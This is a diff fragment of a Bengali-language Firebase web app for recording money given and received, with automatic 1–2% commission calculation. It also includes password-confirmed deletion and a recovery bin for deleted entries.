+            <button class="btn btn-danger" style="flex:1" onclick="doLogout()">লগআউট</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Password confirm modal — for individual delete + delete all -->
+      <div class="pass-modal" id="pass-modal">
+        <div class="pass-box">
+          <div style="font-size:34px;margin-bottom:8px" id="pass-modal-icon">🔐</div>
+          <div style="font-size:15px;font-weight:800;color:#fff;margin-bottom:4px;font-family:'Rajdhani',sans-serif;letter-spacing:1px" id="pass-modal-title">পাসওয়ার্ড নিশ্চিত করুন</div>
+          <p style="font-size:10px;color:var(--text3);margin-bottom:14px;font-family:'Share Tech Mono',monospace" id="pass-modal-sub">ডিলিট করতে পাসওয়ার্ড দিন</p>
+          <input class="inp" id="confirm-pass" type="password" placeholder="পাসওয়ার্ড" onkeydown="if(event.key==='Enter')confirmDelete()"/>
+          <div class="err-msg" id="confirm-err" style="margin-top:8px;text-align:left"></div>
+          <div style="display:flex;gap:8px;margin-top:12px">
+            <button class="btn btn-ghost btn-sm" style="flex:1" onclick="cancelDelete()">বাতিল</button>
+            <button class="btn btn-danger" style="flex:1;padding:9px" id="confirm-del-btn" onclick="confirmDelete()">🗑️ ডিলিট</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Toast -->
+      <div class="toast-wrap" id="toast-wrap"></div>
+
+    </div><!-- /.app-root -->
+  </div><!-- /.phone-screen -->
+  <div class="home-indicator"></div>
+  <div class="phone-bottom-fade"></div>
+</div><!-- /.phone-shell -->
+</div><!-- /.phone-wrap -->
+
+<script>
+firebase.initializeApp({
+  apiKey:"AIzaSyBJw9d68DWObiwlFRckeCsSzR2epGa_nbU",
+  authDomain:"commission-7a71a.firebaseapp.com",
+  projectId:"commission-7a71a",
+  storageBucket:"commission-7a71a.firebasestorage.app",
+  messagingSenderId:"825271350227",
+  appId:"1:825271350227:web:5ea606e607f376d32d3526"
+});
+const auth = firebase.auth();
+const db   = firebase.firestore();
+
+// ═══ STATE ═══
+let currentUser       = null;
+let currentPage       = 'home';
+let pendingDeleteId   = null;
+let pendingDeleteType = null;
+let pendingDeleteAll  = false;    // ✅ NEW: flag for delete all
+let allDilam = [];
+let allPelam = [];
+let recoveryItems    = [];
+let recoveryUnsubscribe = null;
+let _autoComm        = 0;
+let _autoCommType    = '';
+
+// ═══ CLOCK ═══
+function updateClock(){
+  const now=new Date();
+  const el=document.getElementById('status-time');
+  if(el) el.textContent=now.getHours().toString().padStart(2,'0')+':'+now.getMinutes().toString().padStart(2,'0');
+}
+updateClock(); setInterval(updateClock,10000);
+
+// ═══ AUTH ═══
+auth.setPersistence(firebase.auth.Auth.Persistence.LOCAL).catch(()=>{});
+
+auth.onAuthStateChanged(user=>{
+  if(user){
+    currentUser=user;
+    document.getElementById('auth-page').classList.remove('active');
+    document.getElementById('app-page').classList.add('active');
+    document.getElementById('user-name-chip').textContent=(user.displayName||user.email.split('@')[0]).slice(0,12);
+    loadAll();
+    setPage('home');
+  } else {
+    currentUser=null;
+    if(recoveryUnsubscribe){recoveryUnsubscribe();recoveryUnsubscribe=null;}
+    document.getElementById('app-page').classList.remove('active');
+    document.getElementById('auth-page').classList.add('active');
+    allDilam=[];allPelam=[];recoveryItems=[];
+  }
+});
+
+function switchAuth(mode){
+  const tabs=document.querySelectorAll('.auth-tab');
+  if(mode==='login'){
+    tabs[0].classList.add('active');tabs[1].classList.remove('active');
+    document.getElementById('login-form').style.display='';
+    document.getElementById('register-form').style.display='none';
+  } else {
+    tabs[1].classList.add('active');tabs[0].classList.remove('active');
+    document.getElementById('register-form').style.display='';
+    document.getElementById('login-form').style.display='none';
+  }
+}
+
+async function doLogin(){
+  const email=document.getElementById('l-email').value.trim();
+  const pass=document.getElementById('l-pass').value;
+  const btn=document.getElementById('l-btn');
+  const err=document.getElementById('l-err');
+  if(!email||!pass){showErr(err,'ইমেইল এবং পাসওয়ার্ড দিন');return;}
+  btn.disabled=true;btn.innerHTML='<span class="loader"></span> লোড হচ্ছে...';err.classList.remove('show');
+  try{await auth.signInWithEmailAndPassword(email,pass);}
+  catch(e){const m={'auth/user-not-found':'এই ইমেইলে অ্যাকাউন্ট নেই','auth/wrong-password':'পাসওয়ার্ড ভুল','auth/invalid-credential':'ইমেইল বা পাসওয়ার্ড ভুল','auth/invalid-email':'ইমেইল সঠিক নয়','auth/too-many-requests':'অনেকবার চেষ্টা হয়েছে'};showErr(err,m[e.code]||e.message);}
+  btn.disabled=false;btn.innerHTML='🔑 লগইন';
+}
+
+async function doRegister(){
+  const name=document.getElementById('r-name').value.trim();
+  const email=document.getElementById('r-email').value.trim();
+  const pass=document.getElementById('r-pass').value;
+  const btn=document.getElementById('r-btn');
+  const err=document.getElementById('r-err');
+  if(!name){showErr(err,'নাম দিন');return;}
+  if(!email){showErr(err,'ইমেইল দিন');return;}
+  if(pass.length<6){showErr(err,'পাসওয়ার্ড কমপক্ষে ৬ অক্ষর');return;}
+  btn.disabled=true;btn.innerHTML='<span class="loader"></span> তৈরি হচ্ছে...';err.classList.remove('show');
+  try{const c=await auth.createUserWithEmailAndPassword(email,pass);await c.user.updateProfile({displayName:name});}
+  catch(e){const m={'auth/email-already-in-use':'এই ইমেইলে অ্যাকাউন্ট আছে','auth/weak-password':'পাসওয়ার্ড শক্তিশালী করুন','auth/invalid-email':'ইমেইল সঠিক নয়'};showErr(err,m[e.code]||e.message);btn.disabled=false;btn.innerHTML='✅ রেজিস্টার';}
+}
+
+function doLogout(){closeModal('modal-logout');auth.signOut();}
+function showLogoutModal(){openModal('modal-logout');}
+
+// ═══ REFS ═══
+const dilamRef    = ()=>db.collection('users').doc(currentUser.uid).collection('dilam');
+const pelamRef    = ()=>db.collection('users').doc(currentUser.uid).collection('pelam');
+const recoveryRef = ()=>db.collection('users').doc(currentUser.uid).collection('recovery');
+
+// ═══ LOAD ═══
+function loadAll(){
+  dilamRef().orderBy('createdAt','desc').onSnapshot(snap=>{
+    allDilam=snap.docs.map(d=>({id:d.id,...d.data()}));
+    if(['home','dilam','activity'].includes(currentPage)) renderPage();
+  },()=>{toast('ডেটা লোড সমস্যা','red');});
+  pelamRef().orderBy('createdAt','desc').onSnapshot(snap=>{
+    allPelam=snap.docs.map(d=>({id:d.id,...d.data()}));
+    if(['home','pelam','activity'].includes(currentPage)) renderPage();
+  },()=>{toast('ডেটা লোড সমস্যা','red');});
+}
+
+// ═══ NAVIGATION ═══
+function setPage(p){
+  currentPage=p;
+  ['home','dilam','pelam','activity','recovery'].forEach(n=>{
+    document.getElementById('nav-'+n)?.classList.remove('active');
+  });
+  document.getElementById('nav-'+p)?.classList.add('active');
+  if(p==='recovery'){startRecoveryListener();}
+  else{if(recoveryUnsubscribe){recoveryUnsubscribe();recoveryUnsubscribe=null;}}
+  renderPage();
+}
+
+function renderPage(){
+  const c=document.getElementById('main-content');
+  if(currentPage==='home')     {c.innerHTML=renderHome();return;}
+  if(currentPage==='dilam')    {c.innerHTML=renderDilam();return;}
+  if(currentPage==='pelam')    {c.innerHTML=renderPelam();return;}
+  if(currentPage==='activity') {c.innerHTML=renderActivity();return;}
+  if(currentPage==='recovery') {renderRecoveryContent(c);return;}
+}
+
+// ═══ TOTALS ═══
+function calcTotals(){
+  const totalDilam=allDilam.reduce((s,r)=>s+(r.amount||0),0);
+  const totalPelam=allPelam.reduce((s,r)=>s+(r.amount||0),0);
+  const totalComm=allPelam.reduce((s,r)=>s+(r.commission||0),0);
+  const totalComm35=allPelam.filter(r=>r.commType==='2%').reduce((s,r)=>s+(r.commission||0),0);
+  const totalComm1=allPelam.filter(r=>r.commType==='1%').reduce((s,r)=>s+(r.commission||0),0);
+  return{totalDilam,totalPelam,totalComm,totalComm35,totalComm1};
+}
+
+// ═══ RENDER HOME ═══
+function renderHome(){
+  const{totalDilam,totalPelam,totalComm,totalComm35,totalComm1}=calcTotals();
+  const today=new Date().toLocaleDateString('bn-BD',{dateStyle:'long'});
+  return`<div class="fu">
+  <div style="background:var(--surface);border:1px solid var(--border);border-radius:13px;padding:14px 16px;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;position:relative;overflow:hidden">
+    <div style="position:absolute;top:0;left:0;right:0;height:1.5px;background:linear-gradient(90deg,var(--accent2),var(--accent),var(--accent3))"></div>
+    <div>
+      <div style="font-size:9px;color:var(--text3);font-family:'Share Tech Mono',monospace;letter-spacing:1px;margin-bottom:2px">DASHBOARD</div>
+      <div style="font-size:14px;font-weight:800;color:#fff;font-family:'Rajdhani',sans-serif">আপনার হিসাব</div>
+      <div style="font-size:9px;color:var(--text3);margin-top:2px;font-family:'Share Tech Mono',monospace">${today}</div>
+    </div>
+    <div style="font-size:32px;animation:float 3s ease-in-out infinite;filter:drop-shadow(0 0 10px rgba(0,255,159,0.4))">📒</div>
+  </div>
+  <div class="summary-grid">
+    <div class="sum-card green" onclick="setPage('dilam')"><span class="sc-icon">💸</span><span class="sc-label">মোট দিলাম</span><span class="sc-value">${fmtBn(totalDilam)}</span><span class="sc-sub">${allDilam.length} এন্ট্রি</span></div>
+    <div class="sum-card blue" onclick="setPage('pelam')"><span class="sc-icon">💰</span><span class="sc-label">মোট পেলাম</span><span class="sc-value">${fmtBn(totalPelam)}</span><span class="sc-sub">${allPelam.length} এন্ট্রি</span></div>
+    <div class="sum-card gold" onclick="setPage('activity')"><span class="sc-icon">📊</span><span class="sc-label">মোট কমিশন</span><span class="sc-value">${fmtBn(totalComm)}</span><span class="sc-sub">2%: ${fmtBn(totalComm35)}</span></div>
+    <div class="sum-card purple" onclick="setPage('activity')"><span class="sc-icon">💎</span><span class="sc-label">১% কমিশন</span><span class="sc-value">${fmtBn(totalComm1)}</span><span class="sc-sub">৳৫০০০+ এন্ট্রি</span></div>
+  </div>
+  <div class="action-row">
+    <div class="action-card green" onclick="openDilam()"><span class="ac-icon">💸</span><span class="ac-title">টাকা দিলাম</span><span class="ac-sub">নতুন এন্ট্রি</span></div>
+    <div class="action-card blue" onclick="openPelam()"><span class="ac-icon">💰</span><span class="ac-title">টাকা পেলাম</span><span class="ac-sub">+ কমিশন AUTO</span></div>
+  </div>
+
+  <!-- ✅ DELETE ALL button on home -->
+  <div style="margin-bottom:12px">
+    <button onclick="promptDeleteAll()" style="width:100%;padding:11px;border-radius:10px;border:1px solid var(--red-bdr);background:var(--red-bg);color:var(--red);font-family:'Rajdhani',sans-serif;font-size:13px;font-weight:700;letter-spacing:1px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:7px;transition:all .2s;"
+      onmouseover="this.style.background='rgba(255,68,85,0.15)'" onmouseout="this.style.background='var(--red-bg)'">
+      🗑️ সব হিসাব ডিলিট করুন
+    </button>
+  </div>
+
+  <div class="sec-head">
+    <h3>🕐 সাম্প্রতিক <div class="sec-line"></div></h3>
+    <button class="btn btn-ghost btn-sm" onclick="setPage('activity')">সব দেখুন</button>
+  </div>
+  ${renderRecentItems()}
+  </div>`;
+}
+
+function renderRecentItems(){
+  const combined=[
+    ...allDilam.slice(0,4).map(r=>({...r,kind:'dilam'})),
+    ...allPelam.slice(0,4).map(r=>({...r,kind:'pelam'})),
+  ].sort((a,b)=>(b.createdAt?.toMillis?.()??0)-(a.createdAt?.toMillis?.()??0)).slice(0,5);
+  if(!combined.length) return`<div class="empty"><div class="ei">📭</div><p>এখনো কোনো এন্ট্রি নেই</p></div>`;
+  return`<div class="hist-card">${combined.map(r=>histItem(r,false)).join('')}</div>`;
+}
+
+// ═══ DILAM PAGE ═══
+function renderDilam(){
+  const total=allDilam.reduce((s,r)=>s+(r.amount||0),0);
+  return`<div class="fu">
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+    <div>
+      <h2 style="font-size:16px;font-weight:800;color:#fff;font-family:'Rajdhani',sans-serif;letter-spacing:1px">💸 টাকা দিলাম</h2>
+      <p style="font-size:10px;color:var(--text3);font-family:'Share Tech Mono',monospace;margin-top:2px">মোট: <span style="color:var(--green);font-weight:700">${fmtBn(total)}</span> — ${allDilam.length} এন্ট্রি</p>
+    </div>
+    <button class="btn btn-primary btn-sm" style="background:linear-gradient(135deg,var(--green2),var(--green));color:#050a0f" onclick="openDilam()">+ নতুন</button>
+  </div>
+  ${allDilam.length===0?`<div class="empty"><div class="ei">💸</div><p>এখনো কোনো এন্ট্রি নেই</p></div>`:`<div class="hist-card">${allDilam.map(r=>histItem({...r,kind:'dilam'},true)).join('')}</div>`}
+  </div>`;
+}
+
+// ═══ PELAM PAGE ═══
+function renderPelam(){
+  const total=allPelam.reduce((s,r)=>s+(r.amount||0),0);
+  const totalC=allPelam.reduce((s,r)=>s+(r.commission||0),0);
+  return`<div class="fu">
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px">
+    <div>
+      <h2 style="font-size:16px;font-weight:800;color:#fff;font-family:'Rajdhani',sans-serif;letter-spacing:1px">💰 টাকা পেলাম</h2>
+      <p style="font-size:10px;color:var(--text3);font-family:'Share Tech Mono',monospace;margin-top:2px">পেলাম: <span style="color:var(--accent);font-weight:700">${fmtBn(total)}</span> | কমিশন: <span style="color:var(--gold);font-weight:700">${fmtBn(totalC)}</span></p>
+    </div>
+    <button class="btn btn-blue btn-sm" onclick="openPelam()">+ নতুন</button>
+  </div>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:7px;margin-bottom:12px">
+    ${['2%','1%'].map(ct=>{const items=allPelam.filter(r=>r.commType===ct);const t=items.reduce((s,r)=>s+(r.commission||0),0);return`<div style="background:var(--gold-bg);border:1px solid var(--gold-bdr);border-radius:11px;padding:11px;text-align:center"><p style="font-size:8px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:1px;font-family:'Share Tech Mono',monospace">${ct} কমিশন</p><p style="font-size:15px;font-weight:800;color:var(--gold);font-family:'Share Tech Mono',monospace">${fmtBn(t)}</p><p style="font-size:9px;color:var(--text3)">${items.length} এন্ট্রি</p></div>`;}).join('')}
+  </div>
+  ${allPelam.length===0?`<div class="empty"><div class="ei">💰</div><p>এখনো কোনো এন্ট্রি নেই</p></div>`:`<div class="hist-card">${allPelam.map(r=>histItem({...r,kind:'pelam'},true)).join('')}</div>`}
+  </div>`;
+}
+
+// ✅ NEW: ACTIVITY PAGE (no delete, permanent record)
+function renderActivity(){
+  const{totalDilam,totalPelam,totalComm,totalComm35,totalComm1}=calcTotals();
+  const combined=[
+    ...allDilam.map(r=>({...r,kind:'dilam'})),
+    ...allPelam.map(r=>({...r,kind:'pelam'})),
+  ].sort((a,b)=>(b.createdAt?.toMillis?.()??0)-(a.createdAt?.toMillis?.()??0));
+
+  const summRows=[
+    ['💸','মোট দিলাম',totalDilam,'var(--green)'],
+    ['💰','মোট পেলাম',totalPelam,'var(--accent)'],
+    ['📊','মোট কমিশন',totalComm,'var(--gold)'],
+    ['〰','২% কমিশন',totalComm35,'var(--gold)'],
+    ['💎','১% কমিশন',totalComm1,'var(--purple)'],
+  ];
+  return`<div class="fu">
+  <h2 style="font-size:16px;font-weight:800;color:#fff;margin-bottom:10px;font-family:'Rajdhani',sans-serif;letter-spacing:1px">📋 সম্পূর্ণ অ্যাক্টিভিটি</h2>
+  <div style="background:var(--surface);border:1px solid var(--border);border-radius:13px;padding:12px 14px;margin-bottom:12px">
+    <p style="font-size:8px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px;font-family:'Share Tech Mono',monospace">📊 মোট হিসাব</p>
+    ${summRows.map(([ic,l,v,c])=>`<div class="data-row"><span class="data-row-label">${ic} ${l}</span><span class="data-row-value" style="color:${c}">${fmtBn(v)}</span></div>`).join('')}
+  </div>
+  ${combined.length===0
+    ?`<div class="empty"><div class="ei">📭</div><p>কোনো অ্যাক্টিভিটি নেই</p></div>`
+    /* ✅ activity items have NO delete button */
+    :`<div class="hist-card">${combined.map(r=>histItem(r,false)).join('')}</div>`}
+  </div>`;
+}
+
+// ✅ RECOVERY with real-time listener
+function startRecoveryListener(){
+  if(recoveryUnsubscribe) recoveryUnsubscribe();
+  recoveryUnsubscribe=recoveryRef().orderBy('deletedAt','desc').onSnapshot(snap=>{
+    recoveryItems=snap.docs.map(d=>({id:d.id,...d.data()}));
+    if(currentPage==='recovery') renderRecoveryContent(document.getElementById('main-content'));
+  },()=>{toast('রিকভারি লোড সমস্যা','red');});
+}
+
+function renderRecoveryContent(container){
+  container.innerHTML=`<div class="fu">
+  <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:6px">
+    <h2 style="font-size:16px;font-weight:800;color:#fff;font-family:'Rajdhani',sans-serif;letter-spacing:1px">♻️ রিকভারি</h2>
+    ${recoveryItems.length>0?`<button class="btn btn-danger btn-sm" onclick="clearAllRecovery()">সব মুছুন</button>`:''}
+  </div>
+  <p style="font-size:10px;color:var(--text3);margin-bottom:12px;font-family:'Share Tech Mono',monospace">ডিলিট হওয়া এন্ট্রি পুনরুদ্ধার করতে পাসওয়ার্ড লাগবে</p>
+  ${recoveryItems.length===0
+    ?`<div class="empty"><div class="ei">♻️</div><p>কোনো মুছে ফেলা এন্ট্রি নেই</p></div>`
+    :`<div class="hist-card">${recoveryItems.map(r=>recoveryItemHtml(r)).join('')}</div>`}
+  </div>`;
+}
+
+// ═══ DILAM SAVE ═══
+function openDilam(){
+  document.getElementById('dilam-amount').value='';
+  document.getElementById('dilam-note').value='';
+  document.getElementById('dilam-type').value='normal';
+  document.getElementById('dilam-cashout-display').style.display='none';
+  openModal('modal-dilam');
+  setTimeout(()=>document.getElementById('dilam-amount').focus(),300);
+}
+
+function calcDilamAmount(){
+  const amt=parseFloat(document.getElementById('dilam-amount').value)||0;
+  const type=document.getElementById('dilam-type').value;
+  const disp=document.getElementById('dilam-cashout-display');
+  if(type==='cashout'&&amt>0){
+    const charge=+(amt*0.0185).toFixed(2);
+    const total=+(amt+charge).toFixed(2);
+    document.getElementById('dilam-cashout-val').textContent='চার্জ: ৳'+fmtNum(charge)+' → মোট: ৳'+fmtNum(total);
+    disp.style.display='flex';
+  } else {
+    disp.style.display='none';
+  }
+}
+
+async function saveDilam(){
+  const rawAmt=parseFloat(document.getElementById('dilam-amount').value);
+  const note=document.getElementById('dilam-note').value.trim();
+  const type=document.getElementById('dilam-type').value;
+  if(!rawAmt||isNaN(rawAmt)||rawAmt<=0){toast('পরিমাণ সঠিকভাবে দিন','red');return;}
+  const amt=type==='cashout'?+(rawAmt*1.0185).toFixed(2):rawAmt;
+  const btn=document.getElementById('dilam-save-btn');
+  btn.disabled=true;btn.innerHTML='<span class="loader"></span> সংরক্ষণ...';
+  try{
+    await dilamRef().add({amount:amt,note,dilamType:type,createdAt:firebase.firestore.FieldValue.serverTimestamp()});
+    toast(type==='cashout'?'✅ ক্যাশ আউট এন্ট্রি যোগ হয়েছে (১.৮৫% যোগ)':'✅ টাকা দিলাম এন্ট্রি যোগ হয়েছে');
+    closeModal('modal-dilam');
+  }catch(e){toast('সমস্যা: '+e.message,'red');}
+  btn.disabled=false;btn.innerHTML='✅ সংরক্ষণ';
+}
+
+// ═══ PELAM SAVE ═══
+function openPelam(){
+  document.getElementById('pelam-amount').value='';
+  document.getElementById('pelam-note').value='';
+  document.getElementById('comm-display').classList.remove('show');
+  _autoComm=0;_autoCommType='';
+  openModal('modal-pelam');
+  setTimeout(()=>document.getElementById('pelam-amount').focus(),300);
+}
+
+// ✅ Commission is READ-ONLY auto-calculated, no manual input
+function calcCommission(){
+  const amt=parseFloat(document.getElementById('pelam-amount').value)||0;
+  const disp=document.getElementById('comm-display');
+  if(amt<=0){disp.classList.remove('show');_autoComm=0;_autoCommType='';return;}
+  if(amt>=5000){_autoCommType='1%';_autoComm=+(amt*0.01).toFixed(2);}
+  else{_autoCommType='2%';_autoComm=+(amt*0.02).toFixed(2);}
+  document.getElementById('comm-display-type').textContent=_autoCommType+' হারে কমিশন';
+  document.getElementById('comm-display-val').textContent='৳'+fmtNum(_autoComm);
+  disp.classList.add('show');
+}
+
+async function savePelam(){
+  const amt=parseFloat(document.getElementById('pelam-amount').value);
+  const note=document.getElementById('pelam-note').value.trim();
+  if(!amt||isNaN(amt)||amt<=0){toast('পরিমাণ সঠিকভাবে দিন','red');return;}
+  const btn=document.getElementById('pelam-save-btn');
+  btn.disabled=true;btn.innerHTML='<span class="loader"></span> সংরক্ষণ...';
+  try{
+    await pelamRef().add({amount:amt,commission:_autoComm,commType:_autoCommType,note,createdAt:firebase.firestore.FieldValue.serverTimestamp()});
+    toast('✅ টাকা পেলাম এন্ট্রি যোগ হয়েছে','blue');
+    closeModal('modal-pelam');
+  }catch(e){toast('সমস্যা: '+e.message,'red');}
+  btn.disabled=false;btn.innerHTML='✅ সংরক্ষণ';
+}
+
+// ═══ DELETE — individual ═══
+function promptDelete(id,kind){
+  pendingDeleteId=id;pendingDeleteType=kind;pendingDeleteAll=false;
+  document.getElementById('confirm-pass').value='';
+  document.getElementById('confirm-err').classList.remove('show');
+  document.getElementById('pass-modal-icon').textContent='🔐';
+  document.getElementById('pass-modal-title').textContent='পাসওয়ার্ড নিশ্চিত করুন';
+  document.getElementById('pass-modal-sub').textContent='ডিলিট করতে পাসওয়ার্ড দিন';
+  document.getElementById('confirm-del-btn').textContent='🗑️ ডিলিট';
+  document.getElementById('pass-modal').classList.add('show');
+  setTimeout(()=>document.getElementById('confirm-pass').focus(),200);
+}
+
+// ✅ NEW: DELETE ALL
+function promptDeleteAll(){
+  pendingDeleteId=null;pendingDeleteType=null;pendingDeleteAll=true;
+  document.getElementById('confirm-pass').value='';
+  document.getElementById('confirm-err').classList.remove('show');
+  document.getElementById('pass-modal-icon').textContent='⚠️';
+  document.getElementById('pass-modal-title').textContent='সব হিসাব ডিলিট?';
+  document.getElementById('pass-modal-sub').textContent=`${allDilam.length+allPelam.length}টি এন্ট্রি মুছে যাবে। পাসওয়ার্ড দিন।`;
+  document.getElementById('confirm-del-btn').textContent='🗑️ সব ডিলিট';
+  document.getElementById('pass-modal').classList.add('show');
+  setTimeout(()=>document.getElementById('confirm-pass').focus(),200);
+}
+
+function cancelDelete(){
+  pendingDeleteId=null;pendingDeleteType=null;pendingDeleteAll=false;
+  document.getElementById('pass-modal').classList.remove('show');
+}
+
+async function confirmDelete(){
+  const pass=document.getElementById('confirm-pass').value;
+  const err=document.getElementById('confirm-err');
+  if(!pass){showErr(err,'পাসওয়ার্ড দিন');return;}
+
+  // Re-authenticate
+  try{
+    const cred=firebase.auth.EmailAuthProvider.credential(currentUser.email,pass);
+    await currentUser.reauthenticateWithCredential(cred);
+  }catch(e){
+    showErr(err,e.code==='auth/wrong-password'||e.code==='auth/invalid-credential'?'পাসওয়ার্ড ভুল':'যাচাই সমস্যা: '+e.message);
+    return;
+  }
+
+  // ✅ BUG FIX: cancelDelete() এর আগে values save করো — না হলে সব null হয়ে যায়
+  const doDeleteAll=pendingDeleteAll;
+  const deleteId=pendingDeleteId;
+  const deleteType=pendingDeleteType;
+
+  cancelDelete(); // এখন নিরাপদে clear করা যাবে
+
+  if(doDeleteAll){
+    try{
+      const batch=db.batch();
+      const ts=firebase.firestore.FieldValue.serverTimestamp();
+      allDilam.forEach(r=>{
+        const {id,...data}=r;
+        batch.set(recoveryRef().doc(),{...data,kind:'dilam',deletedAt:ts});
+      });
+      allPelam.forEach(r=>{
+        const {id,...data}=r;
+        batch.set(recoveryRef().doc(),{...data,kind:'pelam',deletedAt:ts});
+      });
+      allDilam.forEach(r=>batch.delete(dilamRef().doc(r.id)));
+      allPelam.forEach(r=>batch.delete(pelamRef().doc(r.id)));
+      await batch.commit();
+      toast('🗑️ সব হিসাব ডিলিট হয়েছে — Recovery তে আছে','red');
+    }catch(e){toast('ডিলিট সমস্যা: '+e.message,'red');}
+    closeModal('modal-detail');
+    return;
+  }
+
+  // Single delete
+  if(!deleteId||!deleteType){toast('কিছু একটা সমস্যা হয়েছে','red');return;}
+  const srcRef=deleteType==='dilam'?dilamRef():pelamRef();
+  try{
+    const docSnap=await srcRef.doc(deleteId).get();
+    if(docSnap.exists){
+      await recoveryRef().add({...docSnap.data(),kind:deleteType,deletedAt:firebase.firestore.FieldValue.serverTimestamp()});
+      await srcRef.doc(deleteId).delete();
+      toast('🗑️ এন্ট্রি সরানো হয়েছে — Recovery তে আছে','red');
+    }else{toast('এন্ট্রি পাওয়া যায়নি','red');}
+  }catch(e){toast('ডিলিট সমস্যা: '+e.message,'red');}
+  closeModal('modal-detail');
+}
+
+// ═══ RECOVERY actions ═══
+// ✅ Recovery করতেও password লাগবে
+let pendingRecoverId=null;let pendingRecoverKind=null;
+
+function promptRecover(id,kind){
+  pendingRecoverId=id;pendingRecoverKind=kind;
+  document.getElementById('confirm-pass').value='';
+  document.getElementById('confirm-err').classList.remove('show');
+  document.getElementById('pass-modal-icon').textContent='♻️';
+  document.getElementById('pass-modal-title').textContent='রিকভারি নিশ্চিত করুন';
+  document.getElementById('pass-modal-sub').textContent='এন্ট্রি ফিরিয়ে আনতে পাসওয়ার্ড দিন';
+  document.getElementById('confirm-del-btn').textContent='♻️ ফিরিয়ে আনুন';
+  // Override confirm action
+  document.getElementById('confirm-del-btn').onclick=confirmRecover;
+  document.getElementById('pass-modal').classList.add('show');
+  setTimeout(()=>document.getElementById('confirm-pass').focus(),200);
+}
+
+async function confirmRecover(){
+  const pass=document.getElementById('confirm-pass').value;
+  const err=document.getElementById('confirm-err');
+  if(!pass){showErr(err,'পাসওয়ার্ড দিন');return;}
+  try{
+    const cred=firebase.auth.EmailAuthProvider.credential(currentUser.email,pass);
+    await currentUser.reauthenticateWithCredential(cred);
+  }catch(e){showErr(err,e.code==='auth/wrong-password'||e.code==='auth/invalid-credential'?'পাসওয়ার্ড ভুল':'যাচাই সমস্যা: '+e.message);return;}
+
+  // ✅ BUG FIX: আগে save করো
+  const recId=pendingRecoverId;
+  const recKind=pendingRecoverKind;
+  pendingRecoverId=null;pendingRecoverKind=null;
+
+  // Reset button onclick
+  document.getElementById('confirm-del-btn').onclick=confirmDelete;
+  cancelDelete();
+
+  if(!recId||!recKind){toast('কিছু একটা সমস্যা হয়েছে','red');return;}
+  try{
+    const docSnap=await recoveryRef().doc(recId).get();
+    if(!docSnap.exists){toast('পাওয়া যায়নি','red');return;}
+    const data=docSnap.data();
+    const{kind:k,deletedAt,...clean}=data;
+    if(!clean.createdAt) clean.createdAt=firebase.firestore.FieldValue.serverTimestamp();
+    const targetRef=recKind==='dilam'?dilamRef():pelamRef();
+    await targetRef.add(clean);
+    await recoveryRef().doc(recId).delete();
+    toast('✅ এন্ট্রি পুনরুদ্ধার হয়েছে');
+  }catch(e){toast('সমস্যা: '+e.message,'red');}
+}
+
+async function permanentDelete(id){
+  try{await recoveryRef().doc(id).delete();toast('🗑️ স্থায়ীভাবে মুছে ফেলা হয়েছে','red');}
+  catch(e){toast('সমস্যা: '+e.message,'red');}
+}
+
+async function clearAllRecovery(){
+  if(!recoveryItems.length) return;
+  if(!confirm(`সব ${recoveryItems.length}টি ডিলিট হওয়া এন্ট্রি চিরতরে মুছে ফেলবেন?`)) return;
+  try{
+    const batch=db.batch();
+    recoveryItems.forEach(item=>batch.delete(recoveryRef().doc(item.id)));
+    await batch.commit();
+    toast('🗑️ সব মুছে ফেলা হয়েছে','red');
+  }catch(e){toast('সমস্যা: '+e.message,'red');}
+}
+
+// ═══ HISTORY ITEM ═══
+// showDelete=true: show delete btn (dilam/pelam pages)
+// showDelete=false: no delete btn (home recent + activity)
+function histItem(r,showDelete){
+  const isD=r.kind==='dilam';
+  const dt=r.createdAt?.toDate?.()??new Date(r.createdAt??Date.now());
+  const noteText=r.note?` — ${esc(r.note)}`:'';
+  return`<div class="hist-item" onclick="showDetail('${r.id}','${r.kind}')">
+  <div class="hist-dot ${isD?'green':'blue'}">${isD?'💸':'💰'}</div>
+  <div class="hist-body">
+    <div class="hist-title">${isD?'দিলাম':'পেলাম'}${noteText}</div>
+    <div class="hist-sub">${fmtDate(dt)}</div>
+    ${isD&&r.dilamType==='cashout'?`<div style="font-size:9px;color:var(--gold);margin-top:1px;font-family:'Share Tech Mono',monospace">ক্যাশ আউট <span class="badge badge-gold">+১.৮৫%</span></div>`:''}
+    ${!isD&&r.commission?`<div style="font-size:9px;color:var(--gold);margin-top:1px;font-family:'Share Tech Mono',monospace">কমিশন: ${fmtBn(r.commission)} <span class="badge badge-gold">${r.commType||''}</span></div>`:''}
+  </div>
+  <div class="hist-right">
+    <div class="hist-amount ${isD?'green':'blue'}">${fmtBn(r.amount||0)}</div>
+    ${showDelete?`<button class="btn btn-danger btn-sm" style="margin-top:1px;font-size:10px;padding:3px 8px" onclick="event.stopPropagation();promptDelete('${r.id}','${r.kind}')">🗑️</button>`:''}
+  </div>
+  </div>`;
+}
+
+// ═══ RECOVERY ITEM ═══
+function recoveryItemHtml(r){
+  const isD=r.kind==='dilam';
+  const dt=r.deletedAt?.toDate?.()??new Date(r.deletedAt??Date.now());
+  return`<div class="hist-item">
+  <div class="hist-dot red">♻️</div>
+  <div class="hist-body">
+    <div class="hist-title">${isD?'দিলাম':'পেলাম'}: ${fmtBn(r.amount||0)}${r.note?' — '+esc(r.note):''}</div>
+    <div class="hist-sub" style="color:var(--red)">মুছেছেন: ${fmtDate(dt)}</div>
+    ${isD&&r.dilamType==='cashout'?`<div style="font-size:9px;color:var(--gold);margin-top:1px;font-family:'Share Tech Mono',monospace">ক্যাশ আউট <span class="badge badge-gold">+১.৮৫%</span></div>`:''}
+    ${!isD&&r.commission?`<div style="font-size:9px;color:var(--gold);margin-top:1px;font-family:'Share Tech Mono',monospace">কমিশন: ${fmtBn(r.commission)}</div>`:''}
+  </div>
+  <div style="display:flex;flex-direction:column;gap:4px;align-items:flex-end;flex-shrink:0;margin-left:6px">
